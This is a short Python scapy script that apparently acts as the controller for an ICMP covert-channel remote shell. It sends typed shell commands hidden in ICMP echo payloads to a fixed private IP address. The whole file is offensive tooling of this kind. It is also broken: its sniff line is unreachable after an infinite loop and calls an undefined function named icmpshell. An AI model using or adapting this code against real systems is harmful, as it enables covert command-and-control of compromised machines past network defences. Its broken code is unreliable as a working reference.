#!/usr/bin/python3
import sys
import os
from scapy.all import *

while True:
    revshell = input("Shell input: ")
    icmppacket = (IP(src="192.168.178.71", dst="192.168.178.67")/ICMP(type=8,id=19401)/Raw(load=revshell))
    sr(icmppacket, timeout=0, verbose=0)

sniff(iface="eth0", prn=icmpshell, filter="icmp", store="0")
